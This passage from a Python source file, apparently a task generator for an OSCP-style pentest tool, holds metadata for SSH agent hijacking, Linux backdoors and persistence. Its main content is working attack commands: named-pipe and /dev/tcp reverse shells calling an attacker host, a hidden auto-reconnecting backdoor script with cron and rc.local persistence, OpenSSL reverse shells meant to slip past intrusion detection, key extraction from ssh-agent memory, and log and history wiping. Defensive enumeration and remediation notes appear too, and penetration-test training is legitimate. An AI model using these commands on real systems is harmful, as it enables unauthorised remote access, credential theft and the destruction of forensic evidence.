                                    'Agent has no identity for target',
                                    'Host key verification failed'
                                ],
                                'next_steps': [
                                    'Enumerate new target system',
                                    'Check for additional agent forwarding',
                                    'Pivot further through network',
                                    'Document SSH access chain for report',
                                    'Obtain flags from new system'
                                ],
                                'alternatives': [
                                    'Test multiple targets: for host in host1 host2 host3; do ssh user@$host; done',
                                    'ProxyJump through compromised host: ssh -J compromised@192.168.45.100 target@192.168.45.200',
                                    'SSH tunnel: ssh -L 8080:internal:80 user@target'
                                ],
                                'notes': 'OSCP LATERAL MOVEMENT GOLD. Agent forwarding allows passwordless SSH using victim\'s keys. Works because: (1) Private keys stored decrypted in agent memory, (2) Root can access any user\'s socket, (3) No key passphrase needed. Document for OSCP report: "Leveraged SSH agent forwarding to pivot from host A to host B using user bob\'s forwarded keys."',
                                'estimated_time': '3-5 minutes'
                            }
                        },
                        {
                            'id': 'extract-agent-private-key',
                            'name': 'Extract Private Key from Agent Memory',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Extract decrypted SSH private keys from agent process memory (advanced)',
                                'alternatives': [
                                    'Use agent memory dump tools (requires root)',
                                    'gdb attach to ssh-agent process',
                                    'memdump + grep for key patterns',
                                    'Metasploit post/linux/gather/ssh_creds module',
                                    'https://github.com/NetSPI/sshatter (SSH key extraction)'
                                ],
                                'success_indicators': [
                                    'Private key extracted from memory',
                                    'Key usable for offline authentication',
                                    'Can copy key to attacker system'
                                ],
                                'failure_indicators': [
                                    'Memory dump failed',
                                    'Key not found in memory',
                                    'Agent uses hardware key (HSM/YubiKey)'
                                ],
                                'next_steps': [
                                    'Save extracted key to ~/.ssh/id_rsa',
                                    'chmod 600 ~/.ssh/id_rsa',
                                    'Use key for persistent access',
                                    'Test key against known hosts'
                                ],
                                'tags': ['OSCP:LOW', 'ADVANCED', 'RESEARCH'],
                                'notes': 'ADVANCED TECHNIQUE - not required for OSCP but demonstrates depth. SSH agent stores private keys DECRYPTED in memory. Root can dump agent process memory and extract keys. HackTricks mentions: "Another option, is that the user owner of the agent and root may be able to access the memory of the agent and extract the private key." Easier to just use agent socket.',
                                'estimated_time': '30+ minutes (advanced/research)'
                            }
                        }
                    ]
                },

                # TASK 4: SSH Agent Forwarding Defense Analysis
                {
                    'id': 'agent-forwarding-defense',
                    'name': 'Analyze Agent Forwarding Security',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Document SSH agent forwarding risks and detection methods',
                        'alternatives': [
                            'Check if ForwardAgent is restricted per-host in ~/.ssh/config',
                            'Verify agent socket permissions: ls -la /tmp/ssh-*',
                            'Monitor agent forwarding in logs: grep ForwardAgent /var/log/auth.log',
                            'Recommend ProxyJump instead of agent forwarding',
                            'Document for OSCP report: "Agent forwarding enabled on compromised host, allowing lateral movement to X, Y, Z systems"'
                        ],
                        'success_indicators': [
                            'Agent forwarding usage documented',
                            'Lateral movement path mapped',
                            'Security implications understood',
                            'Defense recommendations provided'
                        ],
                        'failure_indicators': [
                            'Cannot determine agent forwarding usage',
                            'No lateral movement achieved'
                        ],
                        'next_steps': [
                            'Map all systems accessible via hijacked agents',
                            'Document SSH access chain in report',
                            'Recommend disabling ForwardAgent or using ProxyJump',
                            'Clean up: unset SSH_AUTH_SOCK'
                        ],
                        'tags': ['OSCP:MEDIUM', 'DOCUMENTATION', 'RESEARCH'],
                        'notes': 'SSH agent forwarding (ForwardAgent yes) is convenient but dangerous. Root on any intermediary system can hijack all forwarded keys. Better alternatives: ProxyJump (-J), SSH certificates, or copy keys when needed. For OSCP report, explain: (1) What agent forwarding is, (2) How you exploited it, (3) Why it\'s dangerous, (4) Remediation (disable ForwardAgent, use ProxyJump).',
                        'estimated_time': '10-15 minutes (documentation)'
                    }
                }
            ]
        }

    def _get_named_pipe_tasks(self, target: str) -> Dict[str, Any]:
        """Generate named pipe backdoor tasks"""
        return {
            'id': 'named-pipe-backdoors',
            'name': 'Named Pipe Backdoor Techniques',
            'type': 'parent',
            'children': [
                # TASK 1: Create Named Pipe Reverse Shell
                {
                    'id': 'create-named-pipe-shell',
                    'name': 'Create Named Pipe Reverse Shell',
                    'type': 'command',
                    'metadata': {
                        'command': '''# Create named pipe reverse shell
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> <LPORT> > /tmp/f

# Attacker listener:
# nc -nlvp <LPORT>''',
                        'description': 'Classic named pipe reverse shell using mkfifo and netcat',
                        'tags': ['OSCP:HIGH', 'BACKDOOR', 'MANUAL'],
                        'flag_explanations': {
                            'rm -f /tmp/f': 'Remove existing pipe if present (-f suppresses errors)',
                            'mkfifo /tmp/f': 'Create FIFO (First In First Out) named pipe',
                            'cat /tmp/f': 'Read from pipe (blocks until input available)',
                            '| /bin/sh -i': 'Pipe input to interactive shell',
                            '2>&1': 'Redirect stderr to stdout (include errors in output)',
                            '| nc <LHOST> <LPORT>': 'Send shell output to attacker listener',
                            '> /tmp/f': 'Write netcat input back to pipe (creates bidirectional loop)'
                        },
                        'success_indicators': [
                            'Named pipe created: file /tmp/f shows "fifo (named pipe)"',
                            'Netcat connects to attacker listener',
                            'Interactive shell prompt on attacker side',
                            'Commands execute and return output'
                        ],
                        'failure_indicators': [
                            'mkfifo: command not found',
                            'nc: connection refused (firewall blocking)',
                            'Shell terminates immediately',
                            'No output on attacker listener'
                        ],
                        'next_steps': [
                            'Stabilize shell: python -c "import pty; pty.spawn(\'/bin/bash\')"',
                            'Background shell: Ctrl+Z, stty raw -echo; fg',
                            'Set terminal: export TERM=xterm',
                            'Upgrade to SSH for persistence'
                        ],
                        'alternatives': [
                            'Bash /dev/tcp: bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1',
                            'Python: python -c "import socket,subprocess,os;..."',
                            'Perl: perl -e \'use Socket;...\'',
                            'PHP: php -r \'$sock=fsockopen("<LHOST>",<LPORT>);...\'',
                            'Ruby: ruby -rsocket -e\'...\''
                        ],
                        'notes': 'Replace <LHOST> with your Kali IP (192.168.45.X) and <LPORT> with listener port (4444). Start nc listener BEFORE running this. Named pipe technique from HackTricks socket/signal exploitation. Clean up: rm /tmp/f when done.',
                        'estimated_time': '2-3 minutes'
                    }
                },

                # TASK 2: Persistent Named Pipe Backdoor
                {
                    'id': 'persistent-pipe-backdoor',
                    'name': 'Create Persistent Pipe Backdoor',
                    'type': 'command',
                    'metadata': {
                        'command': '''# Create auto-restart backdoor script
cat > /tmp/.pipe_backdoor.sh << 'EOF'
#!/bin/bash
while true; do
    rm -f /tmp/f
    mkfifo /tmp/f
    cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> <LPORT> > /tmp/f
    sleep 5
done
EOF

chmod +x /tmp/.pipe_backdoor.sh
nohup /tmp/.pipe_backdoor.sh > /dev/null 2>&1 &''',
                        'description': 'Create self-restarting named pipe backdoor with auto-reconnect',
                        'tags': ['OSCP:MEDIUM', 'BACKDOOR', 'PERSISTENCE'],
                        'flag_explanations': {
                            'cat > /tmp/.pipe_backdoor.sh': 'Create backdoor script (hidden with . prefix)',
                            'while true': 'Infinite loop for auto-restart',
                            'sleep 5': 'Wait 5 seconds before reconnect attempt',
                            'nohup': 'Run immune to hangup signals',
                            '> /dev/null 2>&1': 'Suppress all output',
                            '&': 'Run in background'
                        },
                        'success_indicators': [
                            'Script created and executable',
                            'Process running in background: ps aux | grep pipe_backdoor',
                            'Auto-reconnects after listener restart',
                            'Survives terminal disconnect'
                        ],
                        'failure_indicators': [
                            'Script not executable',
                            'Process terminates',
                            'No auto-reconnect'
                        ],
                        'next_steps': [
                            'Add to cron: @reboot /tmp/.pipe_backdoor.sh',
                            'Test disconnect/reconnect',
                            'Monitor process: watch -n 1 "ps aux | grep pipe_backdoor"',
                            'Clean up when done: pkill -f pipe_backdoor; rm /tmp/.pipe_backdoor.sh'
                        ],
                        'alternatives': [
                            'Systemd service for modern systems',
                            'Add to /etc/rc.local for boot persistence',
                            'User .bashrc/.profile for login persistence',
                            'Cron @reboot directive'
                        ],
                        'notes': 'Educational persistent backdoor. In production engagement: use /dev/shm (memory-backed), encrypt traffic, implement auth. Auto-reconnect useful when losing shells during enumeration. Replace <LHOST>/<LPORT>.',
                        'estimated_time': '5-10 minutes'
                    }
                },

                # TASK 3: Advanced Named Pipe with Encryption
                {
                    'id': 'encrypted-pipe-backdoor',
                    'name': 'Encrypted Named Pipe Backdoor',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create encrypted named pipe backdoor for stealth (advanced)',
                        'alternatives': [
                            'OpenSSL encrypted reverse shell: mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | openssl s_client -quiet -connect <LHOST>:<LPORT> > /tmp/f',
                            'Attacker listener: openssl s_server -quiet -key key.pem -cert cert.pem -port <LPORT>',
                            'Socat encrypted: socat OPENSSL-LISTEN:<LPORT>,cert=server.pem,verify=0 EXEC:/bin/bash',
                            'SSH tunnel: ssh -R <LPORT>:localhost:22 attacker@<LHOST>'
                        ],
                        'success_indicators': [
                            'Encrypted connection established',
                            'Traffic not readable in plaintext',
                            'Shell access via encrypted channel'
                        ],
                        'failure_indicators': [
                            'openssl/socat not available',
                            'Certificate generation failed',
                            'Connection establishment failed'
                        ],
                        'next_steps': [
                            'Generate SSL certificates: openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes',
                            'Test encrypted connection',
                            'Document encryption method in report'
                        ],
                        'tags': ['OSCP:LOW', 'ADVANCED', 'STEALTH'],
                        'notes': 'Advanced technique - encrypts backdoor traffic to evade IDS/packet inspection. Not required for OSCP but demonstrates depth. OpenSSL reverse shell bypasses plaintext detection. Requires SSL cert generation on both sides.',
                        'estimated_time': '15-20 minutes'
                    }
                }
            ]
        }

    def _get_general_persistence_enum(self, target: str) -> Dict[str, Any]:
        """Generate general Linux persistence enumeration tasks"""
        return {
            'id': 'general-persistence-enum',
            'name': 'General Persistence Enumeration',
            'type': 'parent',
            'children': [
                # TASK 1: Enumerate Existing Backdoors
                {
                    'id': 'enum-existing-backdoors',
                    'name': 'Enumerate Existing Backdoors',
                    'type': 'command',
                    'metadata': {
                        'command': '''# Check for suspicious sockets
find /tmp /var/run /dev/shm -type s 2>/dev/null

# Check for suspicious listening processes
netstat -antlp | grep LISTEN

# Check cron jobs for backdoors
cat /etc/crontab /etc/cron.*/* /var/spool/cron/* 2>/dev/null | grep -v "^#"

# Check systemd timers
systemctl list-timers --all

# Check rc.local
cat /etc/rc.local 2>/dev/null

# Check user startup files
find /home -name ".bashrc" -o -name ".bash_profile" -o -name ".profile" 2>/dev/null | xargs grep -l "nc\\|bash\\|socket" 2>/dev/null''',
                        'description': 'Enumerate existing persistence mechanisms and backdoors on target',
                        'tags': ['OSCP:HIGH', 'ENUM', 'POST_EXPLOIT'],
                        'flag_explanations': {
                            'find ... -type s': 'Find Unix socket files',
                            'netstat -antlp': 'Show all listening TCP connections with process info',
                            '/etc/crontab': 'System cron jobs',
                            '/var/spool/cron/*': 'User cron jobs',
                            'systemctl list-timers': 'Systemd timer units (modern cron alternative)',
                            '/etc/rc.local': 'Legacy boot script',
                            'grep -l "nc\\|bash\\|socket"': 'Search for backdoor patterns'
                        },
                        'success_indicators': [
                            'Suspicious sockets found in /tmp',
                            'Unknown listening processes',
                            'Unusual cron jobs',
                            'Backdoor patterns in startup files'
                        ],
                        'failure_indicators': [
                            'All processes/sockets appear legitimate',
                            'No suspicious cron jobs',
                            'Clean startup files'
                        ],
                        'next_steps': [
                            'Investigate suspicious processes',
                            'Review cron job scripts',
                            'Check process network connections: lsof -i',
                            'Document findings for OSCP report'
                        ],
                        'alternatives': [
                            'Manual: ls -la /tmp /var/run | grep "^s"',
                            'pspy: Monitor process execution in real-time',
                            'rkhunter: Rootkit detection tool',
                            'chkrootkit: Alternative rootkit checker'
                        ],
                        'notes': 'Enumerate before creating backdoors to avoid conflicts. Document existing persistence for defensive recommendations. Common backdoor locations: /tmp, /dev/shm, /var/run, ~/.bashrc, cron.',
                        'estimated_time': '5-10 minutes'
                    }
                },

                # TASK 2: Test Persistence Survival
                {
                    'id': 'test-persistence-survival',
                    'name': 'Test Backdoor Persistence',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Verify backdoors survive reboot and service restart',
                        'alternatives': [
                            'Test reboot survival (if possible): sudo reboot',
                            'Test service restart: systemctl restart target_service',
                            'Test user logout/login',
                            'Check if backdoor recreates after deletion',
                            'Verify cron execution: grep CRON /var/log/syslog'
                        ],
                        'success_indicators': [
                            'Backdoor survives reboot',
                            'Auto-reconnect after network interruption',
                            'Persists through service restarts',
                            'Multiple persistence methods working'
                        ],
                        'failure_indicators': [
                            'Backdoor lost after reboot',
                            'Manual restart required',
                            'Persistence mechanism failed'
                        ],
                        'next_steps': [
                            'Add redundant persistence methods',
                            'Document persistence mechanisms',
                            'Test each mechanism individually',
                            'Create cleanup script for exam end'
                        ],
                        'tags': ['OSCP:MEDIUM', 'PERSISTENCE', 'MANUAL'],
                        'notes': 'Test persistence BEFORE losing initial access. Multiple methods recommended: cron + systemd + rc.local. For OSCP: demonstrate understanding but clean up after. Document all persistence in report.',
                        'estimated_time': '10-15 minutes'
                    }
                },

                # TASK 3: Cleanup and Anti-Forensics
                {
                    'id': 'persistence-cleanup',
                    'name': 'Backdoor Cleanup and Anti-Forensics',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Clean up persistence mechanisms and remove traces',
                        'alternatives': [
                            'Remove socket backdoors: rm /tmp/.*.sock',
                            'Kill backdoor processes: pkill -f backdoor',
                            'Remove cron jobs: crontab -e (delete persistence entries)',
                            'Clear systemd services: systemctl disable backdoor.service',
                            'Clear logs: > /var/log/auth.log (TESTING ONLY)',
                            'Remove scripts: rm /tmp/.backdoor* /dev/shm/.backdoor*',
                            'Clear command history: history -c && rm ~/.bash_history'
                        ],
                        'success_indicators': [
                            'All backdoors removed',
                            'No suspicious processes running',
                            'Cron cleaned',
                            'System restored to pre-exploitation state'
                        ],
                        'failure_indicators': [
                            'Backdoors persist after cleanup',
                            'Processes still running',
                            'Cron jobs remain'
                        ],
                        'next_steps': [
                            'Verify cleanup: netstat, ps, crontab -l',
                            'Document cleanup in OSCP report',
                            'Leave detailed notes for defenders',
                            'Capture screenshots before cleanup'
                        ],
                        'tags': ['OSCP:HIGH', 'CLEANUP', 'MANUAL'],
                        'notes': 'CRITICAL FOR OSCP: Clean up all persistence after exam! Document what you installed, where, and how to remove. Demonstrate professionalism. Cleanup checklist: sockets, processes, cron, systemd, rc.local, startup files, logs.',
                        'estimated_time': '5-10 minutes'
                    }
                }
            ]
        }
